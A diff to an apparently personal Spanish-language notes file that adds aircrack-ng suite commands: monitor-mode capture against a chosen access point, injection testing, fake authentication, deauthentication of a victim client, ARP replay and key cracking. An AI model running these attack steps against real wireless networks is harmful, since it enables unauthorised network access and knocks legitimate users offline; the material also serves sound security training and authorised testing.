@@ -22,3 +22,32 @@ airmon-ng start wlan0 // Poner en modo monitor la interfaz
 airmon-ng stop mon0 // Para el modo monitor
 airmon-ng start wlan0 3 // Modo monitor en ese canal (útil para filtrar solo el canal de la red que queramos)
   Comprobar con iwlist mon0 channel
+airodump-ng mon0 // Empezar captura de paquetes
+airodump-ng -c 3 mon0
+macchanger -s mon0 // Muestra nuestra MAC
+airodump-ng -c 3 --bssid MAC-AP -w NOMBRE-CAPTURA mon0
+wireshark NOMBRE-CAPTURA
+
+#########################
+
+aireplay-ng -9 mon0 // Injection test
+aireplay-n -9 -i wlan1 mon0 // Probar inyección en una segunda tarjeta que tengamos
+
+#######################
+
+Fake auth Atack
+aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0 (Puede que haga falta una MAC válida si tienen MAC filtering)
+
+Deauth Attack
+aireplay-ng -0 1 (num packets to send, 0 para infinito) -a MAC-AP -c VICTIM-MAC mon0
+
+Arp Replay? El más fiable
+aireplay-ng -1 0 -e ESSID-AP -a MAC-AP -h NUESTRA-MAC mon0
+aireplay-ng -3 -b MAC-AP -h NUESTRA-MAC mon0
+(Para acelerar el proceso y obtener un paquete ARP que poder reenviar) aireplay-ng -0 1 (num packets to send, 0 para infinito) -a MAC-AP -c VICTIM-MAC mon0
+
+#####################
+
+aircrack-ng -0 (con colorines) CAPTURE-FILENAME
+
+
